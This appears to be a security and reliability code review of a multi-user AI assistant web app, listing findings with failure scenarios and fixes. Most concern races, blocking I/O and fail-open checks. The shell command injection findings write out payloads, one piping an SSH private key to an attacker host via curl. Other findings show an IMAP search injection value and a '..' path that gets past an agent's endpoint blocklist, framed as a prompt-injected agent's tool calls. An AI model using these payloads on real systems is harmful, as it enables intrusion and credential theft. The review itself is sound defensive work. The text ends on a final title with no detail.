title: Gallery ownership check fails open on any exception
detail: In serve_generated_image (lines 408-425) the per-user ownership check is wrapped in `try: ... except Exception: pass`. If SessionLocal() raises, the query fails (e.g. SQLite 'database is locked' under concurrent writes, which is common), or the import fails, the exception is swallowed and execution falls through to FileResponse — serving another user's private gallery image. Failure scenario: user B requests /api/generated-image/<hash>.png for user A's imported image while a long write transaction holds the SQLite lock; the ownership query raises OperationalError, `pass` executes, and B receives A's image bytes. The comment on line 406 explicitly says filenames are guessable 12-hex hashes, so this is the only barrier.
fix: Fail closed: catch only HTTPException to re-raise, and on any other exception during the ownership lookup return 404/503 instead of falling through, e.g. `except Exception: raise HTTPException(status_code=404, detail="Image not found")`. Keep the DB session usage inside the try with its own narrow error handling.

title: bcrypt.checkpw runs synchronously on the event loop for every bearer-token request
detail: AuthMiddleware.dispatch is async, but `_bcrypt.checkpw(raw_token.encode(), thash.encode())` (line 324) is a CPU-bound call taking ~100-300ms at typical cost factors, executed inline in the loop over prefix candidates. Every API-token request blocks the entire event loop for that duration (multiplied by the number of candidate hashes sharing the 8-char prefix). Failure scenario: 5 concurrent API clients using bearer tokens serialize all other traffic — streaming chat responses, SSE, health checks — stalling for ~1s+; under sustained API load the whole server becomes unresponsive. Ironically the DB refresh and last_used update around it were already moved off the loop, but the most expensive operation was not.
fix: Run the check off-loop: `if await _asyncio.to_thread(_bcrypt.checkpw, raw_token.encode(), thash.encode()):` inside the candidate loop.

title: Bearer-auth try block swallows downstream handler exceptions and converts 500s into 401 'Invalid API token'
detail: The `try:` starting at line 314 encloses `return await call_next(request)` (line 355). In Starlette, unhandled exceptions from route handlers propagate up through call_next in user middleware (ServerErrorMiddleware is outermost). So for a request with a VALID bearer token, any unhandled exception in the actual route (a ValueError, DB error, etc.) is caught by `except Exception` at line 356, logged only as a vague 'API token auth error' warning with exc_info=False, and returned to the client as 401 {'error': 'Invalid API token'}. Failure scenario: an external integration hits a route that raises; instead of a 500 with a traceback in logs, the client sees 401 and concludes its token was revoked — it may stop retrying or trigger a re-auth flow, and the real bug is invisible (no traceback logged).
fix: Move `return await call_next(request)` out of the try block: perform cache refresh + bcrypt matching inside the try, set a `matched` flag, and after the try/except do the request.state assignments and call_next. Also log with exc_info=True in the except.

title: Background loops in _startup_tasks are never cancelled on shutdown and duplicate on lifespan re-entry
detail: _startup_event appends long-lived `while True` tasks to app.state._startup_tasks (keepalive loop line 972, null-owner sweep line 1067, nightly skill audit line 1097, cookbook serve lifecycle line 1106, plus MCP/warmup tasks), but _shutdown_event (line 1110) only cancels upload_cleanup_task — none of the _startup_tasks are cancelled or awaited. Failure scenario: (a) on graceful shutdown the keepalive loop keeps making httpx requests and the sweep loop keeps opening DB sessions until uvicorn force-closes the loop, producing 'Task was destroyed but it is pending' errors and potentially a half-committed DB write; (b) in tests or any environment that runs the lifespan more than once (TestClient per test), line 899 `getattr(app.state, "_startup_tasks", [])` reuses the old list and appends a second copy of every loop — two keepalive loops, two hourly owner-sweeps, two nightly audits — accumulating tasks, threads (to_thread) and DB churn without bound.
fix: In _shutdown_event: `for t in getattr(app.state, "_startup_tasks", []): t.cancel()` then `await asyncio.gather(*tasks, return_exceptions=True)` and reset `app.state._startup_tasks = []`. In _startup_event, start from a fresh list instead of reusing the prior one.

title: Token cache clear/update race causes spurious 401s for valid tokens
detail: _refresh_token_cache (run in a worker thread via to_thread) rebuilds the shared `_token_cache` dict with `_token_cache.clear()` (line 228) followed by `_token_cache.update(new_map)` (line 229), while concurrent event-loop requests read `_token_cache.get(prefix, ())` at line 319 WITHOUT holding _token_cache_lock (only the refresh path takes the lock, and only when dirty). Failure scenario: request A creates a token (cache marked dirty); request B triggers the refresh in a thread; request C with a valid existing token executes line 319 in the window between clear() and update(), gets an empty candidate list, and is rejected 401 'Invalid API token' — an intermittent, unreproducible auth failure for external integrations exactly when tokens are being created/revoked.
fix: Swap atomically instead of clear-then-update: compute `stale = set(_token_cache) - set(new_map)`, then `_token_cache.update(new_map)` followed by `for k in stale: _token_cache.pop(k, None)`. (Each individual dict op is atomic under the GIL, so readers always see either the old or new entry for a prefix, never an empty map.)

title: Fire-and-forget _touch_last_used task held only by weak reference; one DB commit per bearer request
detail: `_asyncio.create_task(_touch_last_used(matched_id))` stores no strong reference to the task. The event loop keeps only weak refs to tasks, so the task can be garbage-collected before it runs, silently dropping the last_used_at update — the exact hazard the code itself guards against for startup tasks at lines 897-900. Additionally, every authenticated bearer request spawns a task + worker thread + new SessionLocal + commit; a chatty integration polling at 10 req/s produces 10 SQLite write transactions per second purely for bookkeeping, competing for the write lock with real work (and feeding the 'database is locked' failure mode of the gallery check).
fix: Keep strong refs: module-level `_bg_tasks: set = set()`, then `t = _asyncio.create_task(...); _bg_tasks.add(t); t.add_done_callback(_bg_tasks.discard)`. Optionally debounce: skip the write if last_used_at was updated within the last N seconds (track in the cache tuple).

title: Synchronous file reads inside async request handlers
detail: _serve_html_with_nonce does a blocking `open()/read()` (lines 759-760) and is called from async handlers serve_index/serve_login/etc. on every page load (no caching — deliberately, for the nonce, but the file bytes could be cached). runtime_info similarly reads /proc/1/cgroup synchronously (line 847). Each call blocks the event loop for a disk read; on a cold cache or network-mounted BASE_DIR (a scenario the file explicitly supports — see the UNC-path comment at lines 21-27), index.html reads can take tens of ms and stall all concurrent streaming responses.
fix: Cache the raw HTML bytes keyed by (path, mtime) at module level and only do string.replace per request, or wrap the read in `await asyncio.to_thread(...)`.

title: O(n^2) FTS backfill executed on every startup
detail: _migrate_chat_messages_fts runs on every boot (called unconditionally from init_db, which itself runs at module import, line 2149). The backfill 'INSERT INTO chat_messages_fts ... WHERE NOT EXISTS (SELECT 1 FROM chat_messages_fts fts WHERE fts.message_id = cm.id)' correlates on message_id, which is declared UNINDEXED in the FTS5 virtual table (line 1734). FTS5 cannot index UNINDEXED columns, so the NOT EXISTS subquery is a full scan of the FTS table for EVERY row of chat_messages — O(n*m) ~= O(n^2). With e.g. 200k chat messages the app performs ~4x10^10 row comparisons at import time on every restart, even when the index is already fully backfilled, blocking startup for minutes while holding a write transaction on the SQLite file.
fix: Only backfill when needed: after creating the triggers, compare 'SELECT count(*) FROM chat_messages_fts' with 'SELECT count(*) FROM chat_messages' and skip the INSERT when equal (triggers keep it in sync thereafter); or use an FTS5 external-content table keyed by chat_messages.rowid (content='chat_messages', content_rowid='rowid') so the anti-join becomes a rowid lookup; or record a one-time completion flag in a schema_migrations/meta table.

title: get_session_by_id returns an expired, detached ORM instance — attribute access raises DetachedInstanceError
detail: get_session_by_id queries inside 'with get_db_session()' and returns the ORM Session object after the context manager commits and closes. SessionLocal (line 43) is created without expire_on_commit=False, so the commit in get_db_session (line 2000) expires all attributes, and session.close() detaches the instance. Failure scenario: any caller does 'sess = get_session_by_id(sid); sess.name' — SQLAlchemy attempts an attribute refresh on a detached instance and raises DetachedInstanceError, turning every consumer of this helper into a 500. (Contrast get_upcoming_events, line 2127, which correctly materializes dicts inside the block.)
fix: Build and return a plain dict inside the with-block (e.g. 'return s.to_dict() if s else None'), or create the session with expire_on_commit=False and expunge the instance before returning.

title: sqlite3 connections leaked on exception in ~18 migration functions
detail: The repeated pattern 'try: conn = sqlite3.connect(...); ...; conn.close() except Exception: log' (e.g. _migrate_add_last_message_at_column lines 701-728, and the same shape in _migrate_add_document_archived_column, _migrate_add_owner_column, _migrate_model_endpoints, _migrate_add_hidden_models_column, _migrate_add_model_endpoint_owner_column, _migrate_add_provider_auth_id_column, _migrate_add_model_type_column, _migrate_add_model_endpoint_refresh_columns, _migrate_add_task_run_model_column, _migrate_add_supports_tools_column, _migrate_add_cached_models_column, _migrate_add_pinned_models_column, _migrate_add_notes_sort_order, _migrate_add_mode_column, _migrate_add_folder_column, _migrate_add_token_columns, _migrate_add_owner_to_table, _migrate_assign_legacy_owner, _migrate_add_api_token_scopes_column, _migrate_add_email_smtp_security, _migrate_add_calendar_* around lines 1786-1976) never closes the connection when any statement between connect() and close() raises. Concrete failure: in _migrate_add_last_message_at_column the bulk UPDATE at line 708 opens a write transaction; if the CREATE INDEX or commit then fails with 'database is locked' (another worker importing the module concurrently), the exception path skips conn.close(), leaving a live sqlite3 connection holding a RESERVED lock until GC — every subsequent migration in init_db then also fails with 'database is locked', all silently downgraded to warnings, and the app starts on a partially migrated schema. Only _migrate_chat_messages_fts (line 1772) closes in a finally block.
fix: Wrap each raw connection in 'with contextlib.closing(sqlite3.connect(db_path)) as conn:' (or try/finally conn.close()), ideally via one shared helper since all these functions share the same shape.

title: bulk_insert_messages inserts rows without a primary key value — always fails with IntegrityError
detail: ChatMessage.id is Column(String, primary_key=True) with no default (line 177), and the mappings built at lines 2012-2020 omit 'id'. bulk_insert_mappings therefore emits INSERT with id=NULL into a column created NOT NULL (primary_key=True implies nullable=False), so SQLite raises 'IntegrityError: NOT NULL constraint failed: chat_messages.id'. get_db_session rolls back and re-raises, so any caller of bulk_insert_messages crashes and no messages are ever persisted — the function cannot succeed as written.
fix: Generate an id per row, e.g. add "'id': uuid.uuid4().hex" to each mapping dict.

title: Unsynchronized import-time migrations race across worker processes
detail: init_db() runs as a module-import side effect with no cross-process lock. Under gunicorn/uvicorn with multiple workers (or a scheduler process importing core.database alongside the web app), every process runs the full migration chain concurrently against the same SQLite file. Concrete failure: two workers both pass the 'column not in columns' check for the same table, both issue ALTER TABLE; one gets 'duplicate column name' or 'database is locked'. Because every migration swallows exceptions into log warnings (e.g. lines 727-728), the losing worker continues booting with the remainder of its migration list skipped or half-applied — e.g. the scheduled_tasks rebuild at lines 1291-1332 can be interrupted after RENAME TO _old_scheduled_tasks, leaving no scheduled_tasks table at all while the app reports startup success.
fix: Move init_db() out of import into an explicit FastAPI startup/lifespan hook, and serialize it: take an exclusive lock first (e.g. 'BEGIN IMMEDIATE' on the SQLite file or a filesystem lock) so exactly one process migrates; make hard failures fatal for destructive steps like the scheduled_tasks table rebuild instead of warn-and-continue.

title: Silent 'except Exception: pass' skips legacy-owner sweep, leaving multi-tenant rows world-visible
detail: _migrate_assign_legacy_owner determines the admin user from auth.json inside 'try: ... except Exception: pass' (lines 1119-1130) and then simply returns if admin_user is None (line 1132) with no log. If auth.json is momentarily unreadable or malformed (e.g. concurrent write by the auth layer), the entire NULL-owner sweep — whose documented purpose is to stop data created while auth was bypassed from sitting in the DB 'world-visible' — is skipped silently on that boot. Rows with owner IS NULL are treated as shared/visible to every user by the query filters described at lines 367-369 and 810-812, so cross-tenant exposure persists with zero operator signal.
fix: Log at warning level in the except branch and when admin_user resolution fails (include the auth.json path), so the skipped sweep is visible; optionally retry on next scheduler tick rather than only at boot.

title: IMAP SEARCH injection via attacker-controlled sender address
detail: In _pre_retrieve_context, the known-sender check runs `_ck.search(None, f'(FROM "{sender_addr}")')` where sender_addr comes straight from email.utils.parseaddr() on the inbound message's From header — fully attacker-controlled — with NO escaping. A From address containing a double quote (e.g. local part `x" ALL "y@evil.com`, which parseaddr passes through) closes the quoted string and injects extra IMAP search criteria such as ALL, forcing the search to match every message and flipping is_known=True. That defeats the cold-sender gate whose entire purpose (per the docstring at lines 1302-1307) is to stop unknown senders from triggering private-context retrieval that gets quoted back in auto-replies. The sibling call at line 1217 (`addr_escaped = sender_addr.replace('"', '\\"')`) is also incomplete: it escapes quotes but not backslashes, so an address containing `\"` becomes `\\"` (escaped backslash + live quote) and still breaks out.
fix: Escape both backslash and quote before interpolation, exactly like _q(): `esc = sender_addr.replace('\\', '\\\\').replace('"', '\\"')` and use it at both line 1217 and line 1349; additionally reject/skip addresses containing '"' or '\\' since they are never legitimate deliverable senders.

title: email_boundaries and sender_signatures caches are not owner-scoped — cross-tenant data leak
detail: The file's own security invariant (comments at lines 380-382 and 407-411) states that Message-ID-keyed AI caches must be owner-scoped because Message-IDs are global (the same newsletter reaches many users with one Message-ID). Yet `email_boundaries` (line 505, `message_id TEXT PRIMARY KEY`) stores `turns_json` — the parsed reply-chain content of the email (line 558) — and `sender_signatures` (line 566, keyed by bare from_address) stores extracted signature text, both with no owner column. On a multi-user deploy, user A's cached thread turns / boundary offsets for a shared Message-ID are served to (or clobbered by) user B, leaking A's thread content and mis-folding B's rendering; sender_signatures leaks signature text learned from one user's mailbox to all users.
fix: Migrate both tables through _ensure_owner_scoped_email_cache_table (PRIMARY KEY (message_id, owner) for email_boundaries; PRIMARY KEY (from_address, owner) for sender_signatures) and add owner to all read/write paths, mirroring the email_tags migration at lines 432-465.

title: _get_email_config fails open to legacy global credentials on any DB error
detail: The whole owner-scoped EmailAccount lookup is wrapped in `except Exception` (line 671) that merely logs at DEBUG and falls through to the legacy settings.json/env-var credentials block (lines 676-693), which has no owner filtering at all. Failure scenario: on a multi-user deploy with legacy flat SMTP/IMAP keys still present in data/settings.json, a transient SQLite lock or SQLAlchemy error during user X's request silently causes X's send/fetch to run against the admin's legacy mailbox credentials — reading or sending mail as another user. This is the opposite of _assert_owns_account (lines 236-240), which deliberately fails closed with 503 for exactly this reason.
fix: Distinguish 'accounts table empty / no row found' (legitimate legacy fallback) from 'DB error' (raise). Re-raise or convert DB exceptions to HTTPException(503) when owner is set, and only use the settings.json fallback when the query succeeded but returned no rows.

title: Explicit account_id silently falls back to a different account
detail: When a caller passes an explicit account_id that is not found, disabled, or owned by someone else (lines 629-635 set row=None), the code silently proceeds to the is_default / first-enabled fallback (lines 639-646) instead of failing. Failure scenario: a scheduled email or cookbook rule references account A; the user later deletes or disables A; the poller calls _get_email_config(account_id=A) and gets account B's config back, so the message is sent from the wrong mailbox/identity with no error and the returned account_id stamp points at B, corrupting derivative cache rows.
fix: When account_id is explicitly provided and cannot be resolved (missing, disabled, or foreign-owned), raise (e.g. LookupError / HTTPException 404) or return a sentinel the caller must handle, rather than falling through to the default-account chain.

title: N+1 queries and per-row session churn in _list_email_accounts
detail: _list_email_accounts loads all enabled EmailAccount rows, then calls `_get_email_config(r.id)` for each one (line 714) while the outer session is still open. Each call opens a brand-new SessionLocal, re-queries the row it already has by id, and closes the session — N+1 queries plus N session open/close cycles and N decrypt calls per poller pass. Background loops (auto-summarize, urgency) call this every cycle, so with many accounts this multiplies SQLite contention against the WAL for zero benefit since the row objects are already in memory.
fix: Refactor config-dict construction out of _get_email_config into a `_row_to_cfg(row)` helper and map it directly over the already-fetched rows inside the single session.

title: Process-global imaplib._MAXLINE mutation permits 50 MB per-line buffers
detail: _open_imap_connection sets `imaplib._MAXLINE = 50_000_000` on every connect. This mutates private module-global state affecting every imaplib consumer in the process (not just this account/connection), and raises the defense limit so a hostile, buggy, or simply huge server response can force the process to buffer up to 50 MB per protocol line, per concurrent connection — several pool slots plus background pollers can compound this into hundreds of MB of transient allocations on a small deploy. Setting it repeatedly is also a (benign but pointless) unsynchronized global write.
fix: Set it once at module import (not per-connect) and lower the ceiling (e.g. 10 MB), or avoid needing giant lines by paging searches (UID SEARCH with ranges) instead of SEARCH ALL over the whole mailbox.

title: Bare except-pass swallows scheduled_emails owner-backfill and turns_json migration failures
detail: The scheduled_emails lazy migration (ALTER TABLE add account_id/atenea_kind/owner + index + owner backfill, lines 516-552) and the email_boundaries turns_json migration (lines 555-560) end in bare `except Exception: pass` with no logging. Failure scenario: a locked database or ALTER failure during startup leaves scheduled_emails without the owner column; every subsequent owner-scoped list/cancel query fails or silently shows users no scheduled sends, and there is zero log evidence pointing at the failed migration. Contrast with the neighboring migrations (lines 338-340, 462-465) which at least log a warning.
fix: Replace `except Exception: pass` with `except Exception as e: logger.warning(f"scheduled_emails migration skipped: {e}")` (and same for the turns_json block) so schema drift is diagnosable.

title: _init_scheduled_db leaks its SQLite connection on mid-migration failure
detail: The sqlite3 connection opened at line 359 has no try/finally; conn.close() only runs at line 576 if every statement succeeds. The first statement inside _ensure_owner_scoped_email_cache_table (`conn.execute(create_sql)`, line 320) executes OUTSIDE that helper's try block, so a disk-full, malformed-db, or locked-db error there propagates out of _init_scheduled_db with the connection (and any partial rebuild like a leftover <table>__old) left open. Because this runs at module import (line 579), the leaked handle can also hold a lock that breaks the very next import attempt.
fix: Wrap the body in `try: ... finally: conn.close()` (or `with contextlib.closing(sqlite3.connect(...)) as conn:`) and commit before close in the finally-protected path.

title: Command injection via nested shlex.quote in remote tmux kill command
detail: In _cookbook_kill_session the remote branch builds `cmd = f"ssh ... {shlex.quote(remote)} 'tmux kill-session -t {shlex.quote(session_id)}'"`. shlex.quote() is designed to produce a standalone shell word; here its output is spliced INSIDE a hand-written single-quoted string, so its own single quotes terminate the outer quoting. session_id and remote_host are supplied by the LLM tool call (do_stop_served_model / do_cancel_download at lines 3345 and 3504 do NO format validation, unlike do_tail_serve_output at 3375 which regex-checks session_id). Failure scenario: a prompt-injected agent calls stop_served_model with remote_host="x" and session_id='a; touch /tmp/pwned; '. shlex.quote yields 'a; touch /tmp/pwned; ', which when embedded as `'tmux kill-session -t 'a; touch /tmp/pwned; ''` is parsed by the shell running /api/shell/exec as separate `;`-delimited commands, executing arbitrary code on the host.
fix: Build the inner command first and quote it as one word, mirroring the correct pattern in do_tail_serve_output: `inner = f"tmux kill-session -t {shlex.quote(session_id)}"; cmd = f"ssh ... {shlex.quote(remote)} {shlex.quote(inner)}"`. Additionally validate session_id with `re.fullmatch(r'[A-Za-z0-9_-]+', session_id)` in do_stop_served_model and do_cancel_download as defense in depth.

title: Command injection via nested shlex.quote in adopt tmux has-session check
detail: do_adopt_served_model builds `check = f"ssh -o ... {shlex.quote(host)} 'tmux has-session -t {shlex.quote(sess)} 2>&1'"`. Same broken pattern as _cookbook_kill_session: shlex.quote(sess) is nested inside a hand-written single-quoted string, and sess (args['tmux_session'], LLM-controlled) is never format-validated. Failure scenario: agent calls adopt_served_model with host="user@host" and tmux_session="a'; curl attacker/$(cat ~/.ssh/id_rsa|base64); '"; the embedded quotes break out of the outer quoting and inject commands into the /api/shell/exec invocation.
fix: Use the whole-command quoting pattern: `inner = f"tmux has-session -t {shlex.quote(sess)} 2>&1"; check = f"ssh -o ... {shlex.quote(host)} {shlex.quote(inner)}"`, and validate sess against `[A-Za-z0-9_-]+` before use.

title: Global _active_document_id shared across all requests causes cross-session document overwrite
detail: _active_document_id is a process-global mutated by set_active_document() (called in do_create_document:314, do_update_document:352, do_edit_document:422) and read as the fallback target in do_update_document:341 and do_edit_document:405. It is not per-session/per-request. Failure scenario: one user with two concurrent chat tabs — tab A creates/opens doc1 (global := doc1), tab B opens doc2 (global := doc2). Tab A's model then emits update_document/edit_document WITHOUT an explicit doc_id; it resolves to the global (doc2) and overwrites the wrong document. Owner filtering in _get_owned_document prevents cross-user leakage but not same-user cross-tab clobbering, and the pointer flaps non-deterministically under interleaving.
fix: Thread the active-document id through the call/session context (e.g. keyed by session_id in a dict or passed explicitly from tool_execution) instead of a bare module global, so concurrent sessions don't share one mutable pointer. At minimum require an explicit doc_id for update/edit rather than falling back to global state.

title: app_api path blocklist bypassable via '..' path segments
detail: do_app_api enforces its safety blocklist with `path.startswith(p)` against prefixes like /api/auth, /api/admin, /api/shell. The check runs on the raw agent-supplied path, but the path is then concatenated onto the base URL and sent to the server. A path such as `/api/cookbook/../admin/wipe` or `/api/cookbook/../../api/shell/exec` starts with an allowed prefix (passes the blocklist) yet, if the ASGI/HTTP layer collapses dot-segments, resolves to a blocked endpoint — defeating the guard that is explicitly meant to keep auth/admin/shell off the agent surface. Failure scenario: a prompt-injected agent issues app_api call with path="/api/cookbook/../admin/..." to reach an admin one-shot that the blocklist was added to prevent.
fix: Normalize/reject before matching: collapse the path with posixpath.normpath (or reject any path containing '..' or '//'), then apply the startswith blocklist to the normalized path so a traversal segment cannot mask a blocked prefix.

title: _probe_single_model omits verify=llm_verify(), so probes fail on custom-CA endpoints and re-probe hides working models
detail: httpx.post(target_url, headers=h, json=payload, timeout=timeout) is the only outbound LLM call in this file that does not pass verify=llm_verify() (compare lines 699, 724, 759, 823, 839, 850, 864). Endpoints served with a self-signed or private-CA certificate that the app is explicitly configured to trust via llm_verify() will work for chat but fail every completion probe with an SSL error caught by the generic except at line 631. Failure scenario: admin runs GET /api/model-endpoints/{id}/probe against an HTTPS vLLM server with a private CA; every model returns status=fail, and line 1839 then writes ALL of them into hidden_models, making the endpoint's entire model list disappear from the picker.
fix: Add verify=llm_verify() to the httpx.post call at line 611, matching every other probe in the file.

title: Blocking synchronous SQLAlchemy/SQLite calls inside async def handlers stall the event loop
detail: Three handlers are declared async def but run sync DB work directly on the event loop: probe_local_endpoints (query at lines 1282-1292 — note the same handler carefully wraps _ping_endpoint in asyncio.to_thread at line 1303 but not the DB work), update_hidden_models (query + commit, lines 1912-1929), and toggle_model_endpoint (query + commit, lines 2053-2100). Unlike the plain-def handlers (which FastAPI runs in a threadpool), these block the single event loop. Failure scenario: a SQLite commit waits on the database write lock (held e.g. by the background refresh thread's db.commit() at line 1122); for that duration every concurrent request — including unrelated chat streaming — freezes.
fix: Either drop async (make them plain def so FastAPI threadpools them — update_hidden_models/toggle_model_endpoint only need the body, which can be taken as Body(...) instead of await request.json()), or wrap all SessionLocal work in await asyncio.to_thread(...).

title: _refresh_inflight single-flight guard is a non-atomic check-then-set
detail: _refresh_caches_bg does `if _refresh_inflight["v"]: return` then `_refresh_inflight["v"] = True` as two separate statements. api_models is a sync route executed on FastAPI's threadpool, so two concurrent GET /api/models requests can both pass the check before either sets the flag, spawning two refresher threads. Each thread then races on the shared _refresh_state entries (both set inflight/fail_count for the same keys) and issues duplicate /models probes against every endpoint — exactly what the guard exists to prevent. Worse, whichever thread finishes first runs the finally block at line 1130 which force-clears inflight for ALL keys while the other thread's probes are still running.
fix: Replace the dict flag with a threading.Lock used non-blockingly: `if not _refresh_lock.acquire(blocking=False): return` and release it in the _do finally block (move the flag set/clear inside the lock), or use a threading.Event with an atomic test-and-set under a lock.

title: _refresh_state grows without bound and retains full API keys for deleted endpoints
detail: _refresh_state is keyed by f"{base}\x00{api_key}" (line 999) and entries are only ever added (setdefault at lines 1092, 1108), never removed — not on endpoint deletion (delete_model_endpoint, line 2200), not on base_url/api_key rotation via PATCH (lines 2086-2097). Failure scenario: a long-running deployment where admins rotate keys or add/remove endpoints accumulates one dict entry per historical URL+key combination forever, each embedding the full plaintext API key in process memory long after the credential was removed from the DB — a slow leak and a needless retention of dead secrets (visible in heap dumps / core files).
fix: Prune the corresponding _refresh_state key in delete_model_endpoint and when PATCH changes base_url or api_key; alternatively key the state by endpoint id and drop entries whose id no longer exists at the start of each _refresh_caches_bg run. Store a sha256 fingerprint of the key in the cache key instead of the raw secret.

title: GET /model-endpoints performs serial 1s live pings per offline endpoint inside the request
detail: list_model_endpoints calls _ping_endpoint(..., timeout=1.0) synchronously for every enabled endpoint that has no cached/pinned models, inside the per-row loop while the DB session is held open (db.close() only in finally at 1559). Failure scenario: an admin with 10 stale endpoints pointing at dead local servers waits ~10+ seconds for the endpoint management page to load (connection-refused is fast, but firewalled/DROPped hosts consume the full 1s timeout each), and the SQLite session stays open the whole time, extending the window for write-lock contention with the background refresh thread.
fix: Collect the rows first, close the DB session, then run the pings concurrently (ThreadPoolExecutor, as _refresh_caches_bg already does) or drop the inline ping entirely and let the existing /model-endpoints/probe-local endpoint (which is parallel and cached) supply liveness.

title: GET /api/probe SSE stream serially probes every model at 8s timeout with unbounded total duration
detail: The _stream generator in probe_models sends one blocking completion request per chat model per endpoint, serially, timeout=8 each (line 1474). With no endpoint_id filter it iterates ALL enabled endpoints; a proxy exposing 200 models where the upstream is slow yields up to 200*8s = ~27 minutes for a single request, pinning one thread from FastAPI's shared threadpool (default cap 40) the whole time. Failure scenario: an admin clicks 'probe all' twice against a large slow proxy and two threadpool threads are consumed for tens of minutes, reducing capacity for every other sync route in the app.
fix: Probe models with a bounded ThreadPoolExecutor (e.g. 4 workers) and yield results as futures complete, and/or cap the per-endpoint model count / total wall-clock budget for a single probe run.

title: GET /api/tools has no authentication while its POST counterpart requires admin
detail: list_tools (line 2232-2241) calls neither require_admin nor any get_current_user gate — it doesn't even take Request. POST /api/tools (line 2247) requires admin. An unauthenticated caller can enumerate every tool tag the agent supports and which ones the admin disabled — useful reconnaissance about the deployment's capabilities (e.g. whether shell/file tools are enabled). Failure scenario: curl http://atenea/api/tools with no session returns the full tool inventory and disabled_tools configuration.
fix: Add `request: Request` and the same auth gate as the rest of the file (require_admin, or at minimum the authenticated-user check used by api_models).

title: Docker first-run generates an admin password that is never displayed (admin lockout)
detail: _run_container_setup() calls create_default_admin() and discards its return value. In a container, stdin is not a TTY, so when ATENEA_ADMIN_USER/ATENEA_ADMIN_PASSWORD are unset the function takes the branch at lines 106-109: it generates a random password via secrets.token_urlsafe(18) and sets show_password=True, expecting the caller to print it. Only _run_host_setup() (lines 257-262) does that printing; the container path prints nothing. Failure scenario: a user runs the Docker image without setting the admin env vars — auth.json is created with a bcrypt hash of a password nobody has ever seen, the '[ok] Admin account created (admin)' line prints only the username, and the user is permanently locked out of the fresh install until they manually delete data/auth.json and re-run with env vars set.
fix: In _run_container_setup(), capture the tuple: `status, user, pwd, show = create_default_admin()` and, when status == 'created' and show is True, print the generated credentials (mirroring lines 257-262), or refuse to auto-generate in Docker and instead exit with a clear message telling the user to set ATENEA_ADMIN_USER/ATENEA_ADMIN_PASSWORD.

title: auth.json written with default umask permissions (credential store readable by other local users)
detail: The credentials file containing the admin bcrypt hash and is_admin flag is created with plain open(auth_path, 'w'), so it inherits the process umask — typically 0o644 (world-readable), and in many Docker base images umask is also 022. Failure scenario: on a multi-user host (or a container with a shared volume), any local user can read data/auth.json, obtain the bcrypt hash, and run an offline dictionary attack; a weak interactively-chosen password falls quickly. A writable-by-group misconfiguration would even allow silent replacement of the hash to seize the admin account. The rest of the app presumably treats this file as the authentication root of trust.
fix: Create the file with restrictive permissions atomically, e.g. `fd = os.open(auth_path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)` then `with os.fdopen(fd, 'w', encoding='utf-8') as f: json.dump(...)`. The O_EXCL flag also closes the small TOCTOU window between the os.path.exists() check at line 89 and the write, preventing a concurrent second run from clobbering an already-written auth.json.

title: Cross-request race on module-global active document/model pointer
detail: _build_system_prompt calls set_active_model(model) (line 715), set_active_document(active_document.id) (line 735) and set_active_document(None) (line 847). These write plain module globals (_active_document_id/_active_model in src/tools/implementations.py:72-85, confirmed no lock, no contextvar). stream_agent_loop then executes tool rounds across MANY awaits (LLM streaming, tool execution). Concrete failure: user A opens doc X and asks 'fix this'; while A's round-1 LLM stream is in flight, user B (or A's second tab) starts a request with no open document, which runs set_active_document(None) — or worse, doc Y. When A's edit_document/update_document block finally executes, it resolves the active document via get_active_document() and edits the WRONG document (B's doc Y) or fails with no active doc. This is cross-user/cross-session data corruption on any concurrently-used server.
fix: Stop using process-wide globals for per-request state: pass the active doc id explicitly into execute_tool_block (it already receives session_id/owner/workspace), or replace _active_document_id/_active_model with contextvars.ContextVar so each asyncio task sees its own value.

title: Skill index built with owner=None leaks every user's skills into all prompts
detail: _build_base_prompt injects the Level-0 skill index via _sm.index_for(owner=None, active_toolsets=...). SkillsManager.load(owner=None) returns ALL skills unfiltered (services/memory/skills.py:278-281), and load()'s own docstring calls the owner filter a SECURITY boundary ('leaked legacy / un-stamped skills to every authenticated user'). By contrast the matched-skills path in _build_system_prompt correctly uses sm.load(owner=owner) (line 956). Concrete failure: multi-user deployment (public/non-admin users are explicitly handled via blocked_tools_for_owner) — user B's private skill names and descriptions (which can encode workflows, hostnames, internal procedures) are injected into user A's prompt as the '## Available skills' block, and the agent can then fetch full SKILL.md bodies it was told about. _build_base_prompt does not even receive the owner, so this cannot currently be correct.
fix: Plumb owner through _build_system_prompt -> _build_base_prompt and call _sm.index_for(owner=owner, ...) so the index obeys the same ownership filter as get_relevant_skills.

title: Tool task orphaned (never cancelled/awaited) when client disconnects mid-tool
detail: _tool_task = asyncio.create_task(_run_tool()) is followed by a drain loop that yields tool_progress SSE events (line 2458). If the HTTP client disconnects, the ASGI server closes the async generator, raising GeneratorExit at that yield (or at any later yield in the round). Nothing cancels or awaits _tool_task: the running bash/python subprocess or MCP call keeps executing to completion with no consumer, its result/exception is never retrieved ('Task exception was never retrieved' warnings), and long-running tools (60s bash, model downloads) accumulate as zombie tasks/subprocesses every time a user closes the tab mid-turn.
fix: Wrap the drain+await in try/finally: on GeneratorExit/any exit, _tool_task.cancel() then await it with contextlib.suppress(asyncio.CancelledError); ensure execute_tool_block propagates cancellation to child subprocesses.

title: Blocking synchronous DB and file I/O inside async stream_agent_loop
detail: Several synchronous SQLAlchemy/SQLite and filesystem operations run directly on the event loop inside the async generator: (1) _load_mcp_disabled_map() at line 1585 does SessionLocal() + db.query(McpServer).all(); (2) the ModelEndpoint.supports_tools lookup at lines 1666-1679 runs up to ~6 filtered queries (one per candidate key from _endpoint_lookup_keys); (3) _build_system_prompt does sync file I/O per request — SkillsManager(DATA_DIR).load()/get_relevant_skills (scans skill files, line 931-960), sm.record_use() which WRITES the usage file once per matched skill (line 968), prefs load (line 926), plus get_setting() reads inside the round loop (line 1952). RAG retrieval was correctly moved to asyncio.to_thread, but these were not. Concrete failure: with N concurrent chat streams, any SQLite lock contention or slow disk stalls the entire event loop — every other user's SSE stream freezes for the duration; record_use is also a read-modify-write file update with no lock, so concurrent requests can drop usage counts.
fix: Move the DB queries and SkillsManager/prefs file I/O behind asyncio.to_thread (they already are for tool_idx calls), batch the endpoint lookup into one IN(...) query, and make record_use fire-and-forget in a thread.

title: Prompt cache key omits ui_language and mcp_disabled_map — stale/wrong-language prompts served
